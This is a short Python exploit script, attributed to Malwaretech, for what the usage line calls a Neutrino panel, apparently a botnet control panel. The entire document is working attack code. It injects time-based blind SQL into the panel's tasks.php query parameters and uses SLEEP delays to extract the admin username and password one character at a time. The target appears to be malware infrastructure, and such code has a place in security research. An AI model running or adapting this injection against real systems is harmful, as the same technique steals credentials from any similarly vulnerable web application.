

Type: Bruteforce

Author: [Malwaretech](https://twitter.com/MalwareTechBlog)

```
import requests
import time
import sys

wait_delay = 1


def brute_length(url, field):

	for i in range(0, 30):
		Injection = "/tasks.php?ip=1', (IF(LENGTH((SELECT %s FROM users WHERE uid='1')) = %d, SLEEP(%d), 0)), '1', '1', '1', '1', '1','1','1');-- -&cn=1&uid=1&os=1&av=1&nat=1&version=1&phone=1&serial=1&quality=1&getcmd=1" % (field, i, wait_delay)
		ConnectUrl  = url + Injection

		start = time.time()
		r = requests.get(ConnectUrl)
		end = time.time()

		if((end - start) >= wait_delay):
			return i

	return 0

def brute_char(url, field, position):

	sys.stdout.write(" ")
	sys.stdout.flush()

	for i in range(32, 127):
		Injection = "/tasks.php?ip=1', (IF(SUBSTRING((SELECT %s FROM users WHERE uid='1'), %d, 1) = BINARY CHAR(%d), SLEEP(%d), 0)), '1', '1', '1', '1', '1','1','1');-- -&cn=1&uid=1&os=1&av=1&nat=1&version=1&phone=1&serial=1&quality=1&getcmd=1" % (field, position, i, wait_delay)
		ConnectUrl = url + Injection

		sys.stdout.write("\b%c" % chr(i))
		sys.stdout.flush()

		start = time.time()
		r = requests.get(ConnectUrl)
		end = time.time()

		if((end - start) >= wait_delay):
			break

def brute_panel(url):

	print("Username: ", end="",flush=True);
	ulen = brute_length(url, "username");

	for i in range(1, ulen+1):
		brute_char(url, "username", i)

	print("\nPassword: ", end="",flush=True);
	plen = brute_length(url, "password");

	for i in range(1, plen+1):
		brute_char(url, "password", i)


if(len(sys.argv) >= 2):
	brute_panel(sys.argv[1])
else:
	print("usage: neutrino.py http://panelurl.com/")
```
